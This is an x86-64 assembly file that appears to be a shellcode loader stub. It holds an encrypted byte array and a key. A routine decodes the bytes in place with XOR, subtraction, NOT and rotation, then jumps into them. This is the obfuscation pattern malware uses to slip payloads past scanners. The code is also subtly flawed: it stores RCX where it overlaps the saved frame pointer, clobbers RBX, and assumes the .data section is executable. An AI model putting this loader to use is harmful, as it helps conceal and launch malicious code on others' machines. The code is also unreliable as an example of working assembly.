section .data
    ; Define the encryption key
    encryption_key dd 12345        ; Store the key as a double word

    ; Define the shellcode array based on the binary content
    shellcode db 0x1f, 0x3a, 0x28, 0x21, 0x25, 0x91, 0xd0, 0x70, 0x29, 0xec, 0xfe, 0xf7, 0xf3
    shellcode_len equ $ - shellcode   ; Calculate the length of the shellcode

section .text
global _start

_start:
    ; Example usage
    lea rsi, [rel shellcode]          ; Address of the shellcode
    mov edi, [rel encryption_key]   ; Encryption key
    mov rcx, shellcode_len      ; Length of the shellcode
    call decrypt

    ; Jump to the decrypted shellcode (assume it's executable and starts at 'shellcode')
    jmp rsi

; Decryption function
; Inputs:
;   RSI - pointer to data (shellcode)
;   RDI - encryption key
;   RCX - length of the data
decrypt:
    push rbp
    mov rbp, rsp
    sub rsp, 0x20        ; Allocate space for local variables

    mov [rbp-4], rcx    ; Save the original rcx (length) value on the stack
    xor rbx, rbx        ; Zero RBX to use as our index

decrypt_loop:
    mov rcx, [rbp-4]    ; Restore the original rcx value (length of the data)
    cmp rbx, rcx        ; Compare index (RBX) with length (RCX)
    jae decrypt_end     ; If index >= length, exit loop

    ; Load the current byte to a register (use RAX to perform operations)
    movzx eax, byte [rsi + rbx]

    ; XOR with (key >> (i % 8))
    mov rdx, rbx            ; Copy index to RDX
    and rdx, 7              ; RDX = i % 8
    mov r8, rdi             ; Copy key to R8
    mov r9, rdx             ; Use R9 to avoid overwriting RCX
    mov cl, r9b             ; Move the shift count into CL
    shr r8, cl              ; Shift key right by the value in CL

    xor eax, r8d                ; XOR the byte with shifted key

    ; Subtract the key
    sub eax, edi                ; Subtract the key

    ; NOT the byte
    not al                      ; Bitwise NOT of the lower byte

    ; Rotate left by 3
    rol al, 3                   ; Rotate left by 3 bits

    ; Store the result back
    mov [rsi + rbx], al         ; Store the transformed byte back into memory

    inc rbx                     ; Increment index
    jmp decrypt_loop            ; Repeat for next byte


decrypt_end:
    add rsp, 0x20        ; Clean up the stack space
    pop rbp
    ret
